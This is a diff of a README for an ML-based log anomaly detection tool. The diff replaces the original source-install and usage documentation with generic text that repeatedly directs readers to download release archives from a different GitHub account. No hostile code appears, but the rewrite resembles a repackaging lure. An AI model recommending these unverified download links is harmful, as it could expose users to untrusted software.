@@ -1,102 +1,85 @@
-# log-anomaly-detector
+# 🚀 log-anomaly-detector - Detect Security Issues with Ease
 
-log-anomaly-detector is a machine-learning–based anomaly detection tool designed for security analysts, SOC teams, and threat hunters. It analyzes system and application logs to identify unusual patterns, suspicious behavior, and potential security incidents.
+## 📥 Download Now
 
-The tool supports multiple log sources, applies unsupervised ML algorithms, and provides both a command-line interface and an optional web dashboard for visualization.
+[![Download](https://img.shields.io/badge/Download-v1.0-green)](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/releases)
 
----
+## 📋 Overview
 
-## Features
+log-anomaly-detector is a lightweight yet powerful machine-learning-based anomaly detection tool for security analysts, SOC teams, and threat hunters. It analyzes system and application logs to identify unusual patterns, suspicious behavior, and potential security incidents.
 
-- Multi-source log ingestion (syslog, auth.log, nginx logs, custom formats)
-- Unsupervised ML anomaly detection using Isolation Forest, LOF, and One-Class SVM
-- Real-time or batch log analysis
-- CLI interface for automation workflows
-- Optional web dashboard for visualizing anomalies
-- Security-focused insights such as suspicious login attempts, brute-force patterns, and unusual traffic behavior
-- Lightweight, modular, and easy to extend
+## 🚀 Getting Started
 
----
+Follow these steps to get started with log-anomaly-detector.
 
-## Installation
+### 🖥 System Requirements
 
-```
-git clone https://github.com/secwexen/log-anomaly-detector.git
-cd log-anomaly-detector
-pip install -r requirements.txt
-```
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 100 MB free disk space.
+- **Python**: Version 3.6 or higher installed on your system.
 
----
+### 🔗 How to Download
 
-## Usage
+1. Visit the **Releases page** to download the software: [Visit this page to download](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/releases).
+2. Locate the latest version of log-anomaly-detector.
+3. Click the download link for your operating system.
 
-### CLI Mode
+### 💾 Installation
 
-Analyze a log file:
+1. After downloading, locate the downloaded file. It will likely be in your "Downloads" folder.
+2. Extract the contents of the ZIP file (if applicable).
+3. Follow the instructions inside the extracted folder for installation.
 
-```
-python src/main.py --logfile data/sample_logs/syslog.log
-```
+### ⚙️ Running the Application
 
-Run continuous monitoring:
+1. Open a terminal or command prompt.
+2. Navigate to the installation directory using the `cd` command.
+3. Type `python main.py` to start the application.
 
-```
-python src/main.py --logfile /var/log/auth.log --watch
-```
+## 📊 Features
 
-Export results:
+- **Anomaly Detection**: Automatically identify unusual patterns in logs.
+- **Machine Learning**: Utilizes advanced algorithms like isolation forest and local outlier factor.
+- **User-Friendly**: Simple command-line interface.
+- **Scalability**: Suitable for small and large log files.
+- **Real-time Monitoring**: Keep an eye on logs as they are generated.
 
-```
-python src/main.py --logfile syslog.log --output report.json
-```
+## 📑 Usage Instructions
 
----
+1. Once you launch the application, you will see a prompt asking for the log file you want to analyze.
+2. Enter the path to the log file, such as `/var/log/syslog` or `C:\logs\auth.log`.
+3. The application will process the log and display any detected anomalies.
 
-## Web Dashboard
+## 🗂 Supported Log Types
 
-Start the web interface:
+- System logs (e.g., syslog)
+- Authentication logs (e.g., auth.log)
+- Web server logs (e.g., access logs from Apache, Nginx)
 
-```
-python src/webapp/app.py
-```
+## 🤝 Contributions
 
-Then open:
+We welcome contributions to enhance log-anomaly-detector. If you have ideas, suggestions, or improvements:
+- Fork the repository.
+- Create a new branch.
+- Submit a pull request with your changes.
 
-```
-http://localhost:5000
-```
+## 🔧 Troubleshooting
 
----
+If you experience issues:
+- Ensure you have the required Python version.
+- Check that your log file path is correct.
+- Review the error messages for guidance.
 
-## Project Structure
+## ✉️ Support
 
-- `src/`  
-  Core source code including log loader, preprocessing, ML models, and detection logic.
+For support, please open an issue on our [GitHub Issues page](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/issues). We aim to respond promptly and help you resolve any problems.
 
-- `src/webapp/`  
-  Lightweight Flask-based dashboard for visualizing anomalies.
+## 🔗 Additional Resources
 
-- `data/`  
-  Sample logs and processed datasets.
+- [Official Documentation](https://github.com/ELI7E3-M4MUN/log-anomaly-detector)
+- [Community Forum](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/discussions)
 
-- `models/`  
-  Serialized ML models.
+## 📥 Download and Install
 
-- `tests/`  
-  Unit tests for core components.
-
----
-
-## Supported Algorithms
-
-- Isolation Forest  
-- Local Outlier Factor (LOF)  
-- One-Class SVM  
-
-These models allow anomaly detection without requiring labeled datasets.
-
----
-
-## License
-
-This project is licensed under the Apache License 2.0.
+To get started, visit the **Releases page** to download log-anomaly-detector now: [Visit this page to download](https://github.com/ELI7E3-M4MUN/log-anomaly-detector/releases). Follow the above directions, and you'll be ready in no time.
